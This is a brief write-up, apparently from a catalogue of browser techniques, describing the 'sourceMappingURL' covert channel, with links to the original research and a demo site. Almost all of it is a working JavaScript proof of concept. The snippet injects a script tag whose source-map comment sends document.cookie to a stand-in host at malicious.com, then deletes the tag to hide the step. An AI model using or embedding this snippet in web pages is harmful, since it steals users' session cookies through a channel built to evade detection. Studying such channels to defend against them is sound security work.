# SourceMappingURL

### POC

```javascript
function  smap(url, data)  {
    const script = document.createElement('script');
    script.textContent =  `//# sourceMappingURL=${url}?data=${JSON.stringify(data)}`;
    document.head.appendChild(script);
    script.remove();
}

smap('https://malicious.com/reportStolenCookies',  {cookie: document.cookie});
```
### Resources

- [Original research and fully detailed explanation](https://weizman.github.io/page-js-anti-debug-1/) [[Gal Weizman](https://weizman.github.io/)]
- [Demo site](https://us-central1-smap-251411.cloudfunctions.net/index) [[Gal Weizman](https://weizman.github.io/)]
